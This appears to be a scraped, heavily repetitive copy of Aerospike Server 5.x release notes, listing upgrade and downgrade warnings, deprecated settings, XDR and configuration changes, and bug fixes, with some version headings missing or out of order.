  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + As of Aerospike Server 4.9 scans are correct. The scan priority, fail\_on\_cluster\_change, and scan percent options, that were deprecated in Aerospike Server 4.9 are removed in Aerospike Server 5.6.

  + The older Aerospike Connect Outbound versions do not work with Aerospike Server version 5.6 or newer. If you are using Aerospike Connect Outbound, you should upgrade respectively to:
    - Aerospike Connect for JMS - Outbound version 3.0.0 or newer
    - Aerospike Connect for Kafka - Outbound version 4.0.0 or newer
    - Aerospike Connect for Pulsar - Outbound version 2.0.0 or newer
    - XDR Proxy version 1.1.0 or newer
  + In Aerospike Server 5.5 or earlier, a UDF returning a Boolean value as a bin would be converted to 1 or 0. In Aerospike 5.6 or newer the value returns as true or false.
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + As of Aerospike Server 4.9 scans are correct. The scan priority, fail\_on\_cluster\_change, and scan percent options, that were deprecated in Aerospike Server 4.9 are removed in Aerospike Server 5.6.
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + The Predicate Expression API will be removed in the Aerospike Server version 6.0 release. Use [Aerospike Filter Expressions](https://docs.aerospike.com/guide/expressions) (added in version 5.2).
  + We have removed support for Ubuntu 16.04.
    - For more information please refer to: [Ubuntu 16.04 LTS (Xenial Xerus)](https://ubuntu.com/16-04).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Bug Fixes

  + Enterprise Only

  + **aerospike-tools** [5.2.0](https://download.aerospike.com/download/tools/notes.html#5.2.0)
* [5.5.0.27](#5.5.0.27)

  **Release Date:** April 20, 2022
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

* [5.5.0.21](#5.5.0.21)

  **Release Date:** January 13, 2022
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

* [5.5.0.15](#5.5.0.15)

  **Release Date:** July 22, 2021
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

  #### Updates

  + **aerospike-tools** [5.0.1](https://download.aerospike.com/download/tools/notes.html#5.0.1)
* [5.4.0.23](#5.4.0.23)

  **Release Date:** January 13, 2022
  + Downgrading from Aerospike Database version 5.4 or newer to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + CentOS Linux 8 End of Life is scheduled for December 2021.

  **Release Date:** January 15, 2021
  + Downgrading from Aerospike Database version 5.4 or newer to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.

* [5.3.0.17](#5.3.0.17)

  **Release Date:** May 10, 2021
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + CentOS Linux 8 End of Life is scheduled for December 2021.
    - For more information please refer to: [FAQ - CentOS Project shifts focus to CentOS Stream](https://centos.org/distro-faq/)

* [5.3.0.8](#5.3.0.8)

  **Release Date:** January 25, 2021
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.

  #### Improvements

  + Enterprise Only
    - [AER-6377] - (XDR) Added service context configuration item [`downgrading`](https://docs.aerospike.com/reference/configuration#downgrading), to enable stripping bin metadata from records sent to older nodes.

  #### Bug Fixes

  + Enterprise Only
    - [AER-6376] - (LDAP) Concurrent client logins at server startup time may lead to various symptoms due to lack of thread safety in the LDAP library.
    - [AER-6378] - (ACL) When a userâs permissions are being assembled from multiple roles, a crash might occur if any of the roles have a whitelist and no privileges.

  #### Known Issues

  + [Known Issues: Server](https://docs.aerospike.com/server/reference/known_issues?all=true&q=5.3.0.2)

  #### Updates

  + **aerospike-tools** [4.0.4](https://download.aerospike.com/download/tools/notes.html#4.0.4)
* [5.2.0.37](#5.2.0.37)

  **Release Date:** October 30, 2021
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support [Aerospike Expression](https://docs.aerospike.com/guide/expressions/) filters. Aerospike Expression filters give access to the full data type APIs (List, Map, Bit, HyperLogLog, Geospatial) and expanded metadata based filtering, to increase the power of filters in selecting records.
  + Support for the info command [`latency`](https://docs.aerospike.com/reference/info#latency) has been removed and replaced with a new info command [`latencies`](https://docs.aerospike.com/reference/info#latencies) to track all latency histograms.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', which replaced the configuration item [`ship-only-specified-bins`](https://docs.aerospike.com/reference/configuration#ship-only-specified-bins) in the 5.0 and 5.1 releases, will be removed in 5.3 and above. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + CentOS Linux 8 End of Life is scheduled for December 2021.
    - For more information please refer to: [FAQ - CentOS Project shifts focus to CentOS Stream](https://centos.org/distro-faq/)

  #### Bug Fixes

  + Enterprise Only
    - [AER-6486] - (STATS) For [`strong-consistency`](https://docs.aerospike.com/reference/configuration#strong-consistency) namespaces, re-replications that time out while queued internally will be reflected in the latency histogram.
    - [AER-6493] - (UDF) The method aerospike:exists() incorrectly returns true for a tombstone.

  #### Bug Fixes

  + Enterprise & Community
    - [AER-6380] - (STATS) The 'batch-sub-restart' microbenchmark histogram is never populated.
  + Enterprise Only
    - [AER-6382] - (LDAP) When connecting to LDAP server, TLS handshake occasionally fails.
    - [AER-6381] - (XDR) If a record expires between XDR reading and shipping, improper TTL will be shipped.

  + Support [Aerospike Expression](https://docs.aerospike.com/guide/expressions/) filters. Aerospike Expression filters give access to the full data type APIs (List, Map, Bit, HyperLogLog, Geospatial) and expanded metadata based filtering, to increase the power of filters in selecting records.
  + Support for the info command [`latency`](https://docs.aerospike.com/reference/info#latency) has been removed and replaced with a new info command [`latencies`](https://docs.aerospike.com/reference/info#latencies) to track all latency histograms.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', which replaced the configuration item [`ship-only-specified-bins`](https://docs.aerospike.com/reference/configuration#ship-only-specified-bins) in the 5.0 and 5.1 releases, will be removed in 5.3 and above. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.

    - [AER-6377] - (XDR) Added service context configuration item [`downgrading`](https://docs.aerospike.com/reference/configuration#downgrading), to enable stripping bin metadata from records sent to older nodes.

  #### Bug Fixes

  + Enterprise Only
    - [AER-6376] - (LDAP) Concurrent client logins at server startup time may lead to various symptoms due to lack of thread safety in the LDAP library.
    - [AER-6378] - (ACL) When a userâs permissions are being assembled from multiple roles, a crash might occur if any of the roles have a whitelist and no privileges.

  #### Bug Fixes

  + Enterprise & Community
    - [AER-6397] - (BALANCE) For AP namespaces, in very rare cases, distinct subset partitions may be erroneously treated as identical.
    - [AER-6402] - (SINDEX) When iterating through secondary indexes to adjust for changing list bin values, inactive indexes are incorrectly skipped, which may cause a crash.
